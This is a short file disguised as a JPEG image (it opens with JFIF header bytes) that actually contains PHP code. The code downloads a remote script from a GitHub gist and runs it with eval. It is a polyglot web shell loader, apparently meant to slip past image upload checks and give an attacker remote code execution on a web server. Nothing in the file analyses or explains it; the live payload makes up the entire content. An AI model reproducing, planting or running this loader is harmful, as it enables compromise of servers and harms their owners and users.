ÿØÿà JFIF ÿþ;<?pHp
   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
      eval('?>' . get('https://gist.githubusercontent.com/paknago21/3a2996f2a2cf1c5f13313c35a6e1b17f/raw/19c779700816cf0f928d78dadd08942e506c2551/based.php'));
?>
